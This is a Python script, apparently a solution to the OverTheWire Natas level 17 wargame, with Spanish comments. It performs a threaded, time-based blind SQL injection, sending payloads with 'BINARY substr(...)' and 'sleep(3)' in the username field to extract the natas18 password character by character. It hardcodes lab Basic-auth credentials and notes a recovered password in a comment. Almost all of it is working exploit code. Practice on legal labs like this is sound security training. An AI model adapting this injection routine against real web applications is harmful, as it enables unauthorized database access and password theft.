
#!/usr/bin/python

from requests import post
#import string
from pwn import *
import time
import threading

def sendRequest(url, data, headers):
    t1 = time.perf_counter()
    resp = post(url,data=data, headers = headers)
    t2 = time.perf_counter()
    return True if t2-t1 > 3 else False

headers = {"Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="}
url = 'http://natas17.natas.labs.overthewire.org/index.php?debug=true'
#payload = ' and (select count(*) from staff ) = 1 -- -'

chars = list("ñÑ") + list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits)

# def filterChars(list):
#     aux = []
#     for char in list:
#         payload = "\" and password like BINARY \"%{}%\" and sleep(3)-- -".format(char)
#         data = {'username': "natas18"+payload}
#         if sendRequest(url,data,headers):
#             aux.append(char)
#     return aux

# filteredChars = filterChars(chars)
# print(str(filterChars))
# exit

# Pass xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
def checker(index,char):
    payload = "\" and BINARY substr((select password from users where username=\"natas18\" limit 0,1),{},1) = '{}' and sleep(3)-- -".format(index,char)
    data = {'username': "natas18"+payload}
    return sendRequest(url,data,headers)
  

def parseComb(subset,thread_name,global_results):

    results = []
    for i,c in subset:
        r = checker(i,c)
        results.append((i,c,r))

    # Warning 
    global_results[thread_name] = results


combinations = [ (i,c) for i in range(1,65) for c in chars ]
threads_list = []
results = {  } 

workers=200
n = len(combinations)
print(n)
window = int(n/workers)   # Cada hilo va a procesar esta cantidad de combinaciones

time1 = time.perf_counter()
logger = log.progress("Testing")

# suponete n = 103  w=20  window=5

# parallelize(data_set, workers, call, global_results)
# call(subset, thread_name, global_results)

for i in range(workers):

    subset = combinations[i*(window):(i+1)*window]
            #combinatios[0:5]
            #combinatios[5:10]
            #combinatios[10:15] ...

            #combinatios[95:100]

    thread_name = str(i)   # string: i-c
    t = threading.Thread(target= parseComb, args=[subset,thread_name,results])
    t.start()
    threads_list.append(t)

subset = combinations[(i+1)*window:]
if len(subset) > 0:
    thread_name = str(workers)   # string: i-c
    t = threading.Thread(target= parseComb, args=[subset,thread_name,results])
    t.start()
    threads_list.append(t)

for t in threads_list:
    t.join()

## Aca sabes que todos los threads terminaron y dejaron su resultado en "results"


time2 = time.perf_counter()

# Itera todos los resultados de todos los hilos, quedandose solo con los exitosos
success_combinations = [ y for x in results.values() for y in x if y[2] ]


# results = { "a" : [(1,"a",True), (1,"a",True), (1,"a",True), ( 1,"a",True)],
#            "b" : [1,2,3,4],
#            "c" : [1,2,3,4]}

# print(success_combinations)
# Ordena                    
sorted_combinations = sorted(success_combinations, key= lambda x: x[0])

# Une en un solo string
# print([ x[1] for x in sorted_combinations ])
password=  "".join([ x[1] for x in list(sorted_combinations) ])
logger.success(password)
print("Time elapsed: " + str(time2-time1))